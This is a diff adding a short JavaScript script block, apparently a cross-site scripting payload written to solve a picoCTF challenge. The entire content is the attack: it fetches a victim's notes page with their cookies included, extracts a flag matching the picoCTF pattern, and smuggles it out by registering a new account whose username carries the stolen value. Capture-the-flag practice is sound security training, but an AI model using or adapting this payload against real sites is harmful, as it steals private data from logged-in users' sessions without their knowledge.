@@ -1,0 +1,10 @@
+<script>
+fetch('http://0.0.0.0:8080/notes',{credentials:'include'})
+.then(r=>r.text())
+.then(h=>{
+let m=h.match(/picoCTF\{[^}]+\}/);
+if(m){
+fetch('http://0.0.0.0:8080/register',{method:'POST',body:new URLSearchParams({username:'full_'+m[0],password:'x'})});
+}
+});
+</script>
